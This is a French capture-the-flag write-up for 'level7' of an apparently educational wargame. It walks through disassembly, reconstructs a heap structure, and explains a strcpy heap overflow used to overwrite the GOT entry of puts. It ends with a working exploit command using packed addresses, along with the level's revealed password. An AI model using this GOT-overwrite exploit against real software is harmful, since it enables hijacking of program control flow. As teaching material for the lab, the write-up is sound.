# Level07

## Démarche

1. **Reconnaissance**

   Lecture du binaire désassemblé :

   ```bash
   objdump -d level7
   ```

   Une fonction `m` est présente mais **jamais appelée** dans `main` :



   ```x86asm
   080484f4 <m>:
    80484fa:  movl   $0x0,(%esp)
    8048501:  call   80483d0 <time@plt>        ; time(0)
    8048506:  mov    $0x80486e0,%edx
    804850f:  movl   $0x8049960,0x4(%esp)      ; buffer global 0x8049960
    804851a:  call   80483b0 <printf@plt>      ; printf(format, 0x8049960, time)
   ```

   Une fonction non appelée qui affiche une zone mémoire est typiquement la
   **cible** à déclencher. Adresse de `m` : `0x080484f4`.

   Une adresse se distingue des buffers heap : `0x8049960`.
  

   ```x86asm
   ; dans m :
   movl   $0x8049960,0x4(%esp)   ; printf affiche cette zone
   ; dans main :
   movl   $0x8049960,(%esp)      ; fgets remplit cette zone
   call   fgets
   ```
   Ce qui prouve que c'est une variable **globale** 
   Ce que ce buffer global contient, depuis le main on peut voir ça :

   ```x86asm
   mov    $0x80486eb,%eax        ; nom de fichier
   call   fopen                  ; fopen("/home/user/level8/.pass", "r")
   movl   $0x44,0x4(%esp)        ; taille 0x44 = 68
   movl   $0x8049960,(%esp)
   call   fgets                  ; fgets(buffer_global, 68, fichier)
   ```

   Verifie dans gdb :

   ```console
   (gdb) x/s 0x80486eb
   0x80486eb:  "/home/user/level8/.pass"
   ```

   Donc `fgets` charge le **mot de passe de level8** dans le buffer global. Et
   `m` affiche ce buffer global. 
   Declencher `m` revient a afficher le `.pass`.
   
   Mais `m` n'est jamais appelee dans le flux normal : tout l'exploit consiste a
   forcer son appel.


2. **Identification des structures**

   Le raisonnement part d'un motif répété dans `main`. Premier bloc :

   ```x86asm
   movl   $0x8,(%esp)
   call   malloc              ; (1) malloc(8)
   mov    %eax,0x1c(%esp)     ; sauvegarde du pointeur
   mov    0x1c(%esp),%eax
   movl   $0x1,(%eax)         ; (2) ecrit 1 a l'OFFSET 0 du bloc

   movl   $0x8,(%esp)
   call   malloc              ; (3) malloc(8)
   mov    %eax,%edx
   mov    0x1c(%esp),%eax
   mov    %edx,0x4(%eax)      ; (4) ecrit l'adresse du malloc a l'OFFSET 4
   ```

   Ce qui permet de conclure a une structure :

   - Un bloc de **8 octets** est accede a **deux offsets distincts** : `(%eax)`
     (offset 0) et `0x4(%eax)` (offset 4). Un bloc touche en deux points fixes de
     natures differentes = deux champs, pas une variable unique.
   - **Offset 0** recoit un entier (`1`) -> champ de type `int` (4 octets).
   - **Offset 4** recoit l'adresse d'un autre `malloc` -> champ de type pointeur
     (4 octets). Ce second malloc est la zone qui servira de tampon .
   - Le motif est **repete a l'identique** pour un second bloc, avec la valeur `2`
     a l'offset 0. Deux instances du meme type.

   D'ou la reconstruction :

   ```c
   struct s {
       int   value;    // offset 0  (1 pour A, 2 pour B)
       char *buffer;   // offset 4  (un malloc(8), rempli par strcpy)
   };
   ```

   Sur le heap, alloues dans l'ordre : `A`, `buffer_a`, `B`, `buffer_b`,
   adjacents.


3. **Faille / principe**

   Apres les structures, `main` fait deux `strcpy`  puis appelle `puts` :

   ```x86asm
   ; strcpy(buffer_a, argv[1])
   add    $0x4,%eax   ; argv[1]
   call   strcpy
   ; strcpy(buffer_b, argv[2])
   add    $0x8,%eax   ; argv[2]
   call   strcpy
   ...
   call   puts        ; appel final, cible de l'ecrasement
   ```

   Disposition heap :

   ```
   [ value_a : 4 ][ buffer_a : 8 ][ entete : 8 ][ value_b : 4 | buffer_b : 4 ]
   ```

   Technique : **GOT overwrite** (write-what-where).

   - Le **1er strcpy**  `buffer_a` va ecraser `buffer_b`
     pour qu'il pointe sur l'entree GOT de `puts`.
   - Le **2e strcpy**  argv[2] = adresse de `m` et ecrit argv[2] a l'adresse pointee par `buffer_b`,
     donc **dans la GOT de puts**. 
   - L'appel `puts` final lit la GOT (desormais = `m`) et saute dans `m`, qui
     affiche le buffer global (le mot de passe).

   Offset pour atteindre `buffer_b` :
   `8 (buffer_a) + 8 (entete) + 4 (value_b) = 20 octets`.

   Adresse GOT de puts (`objdump -R level7 | grep puts`) : `0x08049928`.

5. **Contournement / implémentation**

   - argv[1] = 20 octets de bourrage + GOT de puts (`\x28\x99\x04\x08`)
   - argv[2] = adresse de m (`0x080484f4` -> `\xf4\x84\x04\x08`)

   ```bash
   ./level7 "$(printf 'Pirate de la memoire\x28\x99\x04\x08')" "$(printf '\xf4\x84\x04\x08')"
   5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
    - 1790794267
   ```

   La ligne du haut est le mot de passe de level8. Le `- 1790794267` est le
   `time(0)` affiche par le printf de `m` (format `"%s - %d"`).

